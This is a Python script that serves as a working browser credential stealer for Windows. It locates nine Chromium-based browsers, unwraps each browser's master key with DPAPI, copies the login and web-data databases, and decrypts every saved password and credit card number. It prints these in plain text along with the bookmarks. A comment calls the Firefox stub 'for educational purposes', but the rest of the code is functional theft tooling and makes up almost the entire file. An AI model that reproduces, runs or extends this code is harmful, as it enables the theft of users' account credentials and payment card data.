import os
import shutil
import sqlite3
import json
import base64
import win32crypt
from Cryptodome.Cipher import AES

def get_chrome_based_browsers():
    local = os.getenv("LOCALAPPDATA")
    roaming = os.getenv("APPDATA")
    return {
        "Chrome": os.path.join(local, "Google", "Chrome", "User Data"),
        "Edge": os.path.join(local, "Microsoft", "Edge", "User Data"),
        "Brave": os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data"),
        "Opera": os.path.join(roaming, "Opera Software", "Opera Stable"),
        "Opera GX": os.path.join(roaming, "Opera Software", "Opera GX Stable"),
        "Vivaldi": os.path.join(local, "Vivaldi", "User Data"),
        "Chromium": os.path.join(local, "Chromium", "User Data"),
        "Yandex": os.path.join(local, "Yandex", "YandexBrowser", "User Data"),
        "Iridium": os.path.join(local, "Iridium", "User Data"),
        # Add more as needed
    }

def get_master_key(browser_path):
    local_state_path = os.path.join(browser_path, "Local State")
    if not os.path.exists(local_state_path):
        return None
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
    master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return master_key

def decrypt_password(buff, master_key):
    try:
        if buff[:3] == b'v10':
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)[:-16].decode()
            return decrypted_pass
        else:
            return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode()
    except Exception:
        return ""

def extract_browser_passwords():
    results = []
    browsers = get_chrome_based_browsers()
    for browser, path in browsers.items():
        login_db = os.path.join(path, "Default", "Login Data")
        if not os.path.exists(login_db):
            continue
        tmp_db = os.path.join(os.getenv("TEMP"), f"{browser}_LoginData.db")
        try:
            shutil.copy2(login_db, tmp_db)
            conn = sqlite3.connect(tmp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            master_key = get_master_key(path)
            for row in cursor.fetchall():
                url, username, encrypted_password = row
                password = decrypt_password(encrypted_password, master_key)
                if username or password:
                    results.append({
                        "browser": browser,
                        "url": url,
                        "username": username,
                        "password": password
                    })
            cursor.close()
            conn.close()
            os.remove(tmp_db)
        except Exception:
            continue
    return results

def extract_browser_cards():
    results = []
    browsers = get_chrome_based_browsers()
    for browser, path in browsers.items():
        cards_db = os.path.join(path, "Default", "Web Data")
        if not os.path.exists(cards_db):
            continue
        tmp_db = os.path.join(os.getenv("TEMP"), f"{browser}_WebData.db")
        try:
            shutil.copy2(cards_db, tmp_db)
            conn = sqlite3.connect(tmp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
            master_key = get_master_key(path)
            for row in cursor.fetchall():
                name, month, year, encrypted_number = row
                card_number = decrypt_password(encrypted_number, master_key)
                results.append({
                    "browser": browser,
                    "name": name,
                    "exp_month": month,
                    "exp_year": year,
                    "card_number": card_number
                })
            cursor.close()
            conn.close()
            os.remove(tmp_db)
        except Exception:
            continue
    return results

def extract_browser_bookmarks():
    results = []
    browsers = get_chrome_based_browsers()
    for browser, path in browsers.items():
        bookmarks_path = os.path.join(path, "Default", "Bookmarks")
        if not os.path.exists(bookmarks_path):
            continue
        try:
            with open(bookmarks_path, "r", encoding="utf-8") as f:
                bookmarks_data = json.load(f)
            def parse_bookmarks(node):
                if isinstance(node, dict):
                    if node.get("type") == "url":
                        results.append({
                            "browser": browser,
                            "name": node.get("name"),
                            "url": node.get("url")
                        })
                    for child in node.get("children", []):
                        parse_bookmarks(child)
            parse_bookmarks(bookmarks_data.get("roots", {}))
        except Exception:
            continue
    return results

def extract_firefox_passwords():
    # Firefox password extraction is more complex (uses logins.json and key4.db)
    # For educational purposes, this is a placeholder.
    # Full support would require parsing key4.db and decrypting with NSS.
    return []

if __name__ == "__main__":
    print("Extracting browser passwords...")
    passwords = extract_browser_passwords()
    for entry in passwords:
        print(f"[{entry['browser']}] {entry['url']} | {entry['username']} | {entry['password']}")
    print("\nExtracting browser credit cards...")
    cards = extract_browser_cards()
    for entry in cards:
        print(f"[{entry['browser']}] {entry['name']} | {entry['card_number']} | {entry['exp_month']}/{entry['exp_year']}")
    print("\nExtracting browser bookmarks...")
    bookmarks = extract_browser_bookmarks()
    for entry in bookmarks:
        print(f"[{entry['browser']}] {entry['name']} | {entry['url']}")
